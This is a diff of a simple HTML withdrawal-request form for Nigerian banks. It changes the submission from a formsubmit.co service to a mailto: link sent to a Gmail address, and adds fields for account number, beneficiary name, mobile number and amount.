@@ -5,82 +5,117 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Withdrawal Form</title>
     <style>
-        body { font-family: Arial, sans-serif; }
-        .container { max-width: 500px; margin: auto; padding: 20px; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 5px; }
-        .form-group input, .form-group select { width: 100%; padding: 8px; box-sizing: border-box; }
-        .form-group button { padding: 10px 15px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
-        .form-group button:hover { background-color: #45a049; }
-        .success-message { display: none; color: green; margin-top: 20px; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .form-container h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .form-group textarea {
+            resize: none;
+            height: 80px;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #218838;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Withdrawal Form</h2>
-        <form id="withdrawalForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST">
+    <div class="form-container">
+        <h2>Withdrawal Request Form</h2>
+        <form action="mailto:empirevirtual99@gmail.com" method="post" enctype="text/plain">
             <div class="form-group">
-                <label for="name">Full Name</label>
-                <input type="text" id="name" name="name" required>
+                <label for="bank">Select Bank:</label>
+                <select id="bank" name="bank" required>
+                    <option value="access_bank">Access Bank</option>
+                    <option value="citibank">Citibank</option>
+                    <option value="diamond_bank">Diamond Bank</option>
+                    <option value="ecobank">Ecobank</option>
+                    <option value="fidelity_bank">Fidelity Bank</option>
+                    <option value="fcmb">First City Monument Bank (FCMB)</option>
+                    <option value="first_bank">First Bank of Nigeria</option>
+                    <option value="gtbank">Guaranty Trust Bank</option>
+                    <option value="heritage_bank">Heritage Bank</option>
+                    <option value="keystone_bank">Keystone Bank</option>
+                    <option value="palmpay">PalmPay</option>
+                    <option value="polaris_bank">Polaris Bank</option>
+                    <option value="providus_bank">Providus Bank</option>
+                    <option value="stanbic_ibtc">Stanbic IBTC Bank</option>
+                    <option value="standard_chartered">Standard Chartered Bank</option>
+                    <option value="sterling_bank">Sterling Bank</option>
+                    <option value="suntrust_bank">Suntrust Bank</option>
+                    <option value="union_bank">Union Bank</option>
+                    <option value="uba">United Bank for Africa (UBA)</option>
+                    <option value="unity_bank">Unity Bank</option>
+                    <option value="wema_bank">Wema Bank</option>
+                    <option value="zenith_bank">Zenith Bank</option>
+                    <option value="opay">OPay</option>
+                </select>
             </div>
             <div class="form-group">
-                <label for="email">Email</label>
-                <input type="email" id="email" name="email" required>
+                <label for="account_number">Account Number:</label>
+                <input type="text" id="account_number" name="account_number" required>
             </div>
             <div class="form-group">
-                <label for="amount">Amount</label>
+                <label for="beneficiary_name">Beneficiary Name:</label>
+                <input type="text" id="beneficiary_name" name="beneficiary_name" required>
+            </div>
+            <div class="form-group">
+                <label for="beneficiary_mobile">Beneficiary Mobile Number:</label>
+                <input type="text" id="beneficiary_mobile" name="beneficiary_mobile" required>
+            </div>
+            <div class="form-group">
+                <label for="amount">Amount:</label>
                 <input type="number" id="amount" name="amount" required>
             </div>
             <div class="form-group">
-                <label for="bank">Bank</label>
-                <select id="bank" name="bank" required>
-                    <option value="" disabled selected>Select your bank</option>
-                    <option value="Access Bank">Access Bank</option>
-                    <option value="Citibank">Citibank</option>
-                    <option value="Diamond Bank">Diamond Bank</option>
-                    <option value="Ecobank">Ecobank</option>
-                    <option value="Fidelity Bank">Fidelity Bank</option>
-                    <option value="First Bank">First Bank</option>
-                    <option value="FCMB">FCMB</option>
-                    <option value="GTBank">GTBank</option>
-                    <option value="Heritage Bank">Heritage Bank</option>
-                    <option value="Keystone Bank">Keystone Bank</option>
-                    <option value="Opay Bank">Opay Bank</option>
-                    <option value="Palmpay Bank">Palmpay Bank</option>
-                    <option value="Polaris Bank">Polaris Bank</option>
-                    <option value="Stanbic IBTC Bank">Stanbic IBTC Bank</option>
-                    <option value="Sterling Bank">Sterling Bank</option>
-                    <option value="Union Bank">Union Bank</option>
-                    <option value="UBA">UBA</option>
-                    <option value="Unity Bank">Unity Bank</option>
-                    <option value="Wema Bank">Wema Bank</option>
-                    <option value="Zenith Bank">Zenith Bank</option>
-                </select>
+                <label for="description">Description:</label>
+                <textarea id="description" name="description">I hereby request for payment.</textarea>
             </div>
             <div class="form-group">
                 <button type="submit">Submit</button>
             </div>
         </form>
-        <div class="success-message" id="successMessage">Your withdrawal request has been submitted successfully!</div>
     </div>
-    <script>
-        document.getElementById('withdrawalForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var form = event.target;
-            var formData = new FormData(form);
-            fetch(form.action, {
-                method: form.method,
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            }).then(response => {
-                if (response.ok) {
-                    document.getElementById('successMessage').style.display = 'block';
-                    form.reset();
-                } else {
-                    alert('There was an issue with your submission. Please try again.');
-                }
-            });
-        });
-    </script>
 </body>
 </html>
